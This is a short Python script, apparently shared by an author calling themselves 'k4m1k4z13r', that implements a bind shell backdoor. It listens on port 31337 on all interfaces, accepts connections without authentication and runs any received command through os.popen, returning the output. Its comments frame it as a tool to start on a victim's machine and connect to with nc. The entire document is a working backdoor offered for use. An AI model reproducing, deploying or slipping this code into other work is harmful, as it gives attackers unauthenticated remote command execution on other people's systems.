# Author - k4m1k4z13r
# Copyright - Copy what you can
# Bind Shell (Socket Backdoor) in python
# Initiate this script on target machine and use nc to connect to the victim

import subprocess
import socket
import sys
import os

subprocess.call('clear',shell=True) # clear the shell screen
host = "0.0.0.0" # target machine address
port = int(31337) # port on which the remote shell is gonna run

try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
		sock.bind((host,port)) #specify host and port
		sock.listen(5) # max 5 connections allowed
		while True:
			cli,addr = sock.accept() # accept a new connection
			cli.send('[*] Connected to victim successfully\n') # write to the connected client
			 
			while True:
				command = cli.recv(2048) # read command from client
				for line in os.popen(command): # execute command, grab the resul and
					cli.send(line) # print the result
except KeyboardInterrupt: # when ctrl+c is pressed on server
		cli.send('[!]Ctrl+C\n[!]^C\n[!]Server forcefully closed by victim\n')
		sock.close()
		sys.exit(1)
except socket.error: # in case there's some error creating the socket
		print "Error creating socket"
